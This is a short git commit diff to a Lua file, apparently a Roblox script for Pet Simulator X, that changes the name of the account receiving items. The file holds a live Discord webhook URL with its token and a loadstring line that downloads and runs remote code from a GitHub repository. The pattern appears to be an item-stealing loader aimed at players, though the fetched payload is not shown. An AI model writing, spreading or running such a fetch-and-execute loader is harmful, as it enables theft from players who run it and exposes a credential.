125855d998f8c53231ce209b5ae5b116e09b4e9f
Muhemmad6196 <121689484+Muhemmad6196@users.noreply.github.com>
2023-01-27 20:56:18 +0300

    Update Repolize.lua

--- Repolize.lua
+++ Repolize.lua
@@ -1,4 +1,4 @@
-UserName = "DavidekXD"
+UserName = "AlMBOTERXX"
 WebHook = "https://discord.com/api/webhooks/1065268047956430949/0tcR60diByAw9D9NSyn2mVLBi4FvxJQI66JNjYmt3Etk3Q-Zc1fCtxYCMjld9fz00O83"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
